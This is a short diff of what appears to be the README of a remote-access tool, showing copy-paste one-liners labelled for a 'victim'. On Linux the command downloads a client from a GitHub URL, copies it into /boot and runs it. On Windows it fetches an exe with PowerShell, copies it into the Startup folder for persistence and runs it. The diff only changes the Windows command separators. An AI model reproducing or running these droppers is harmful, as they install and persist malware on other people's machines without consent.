@@ -16,7 +16,7 @@ https://discord.gg/vCdPTjD6rZ
 cd /tmp; apt-get update -y; apt-get install curl -y; curl -O LClient "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 LClient; cp LClient /boot; ./LClient
 
 # Windows victim
-cd %temp% & powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile WClient.exe & copy WClient.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" & WClient.exe
+cd %temp% && powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile WClient.exe && copy WClient.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" && WClient.exe
 
 # Credits
 Orig - batu.sh#9675
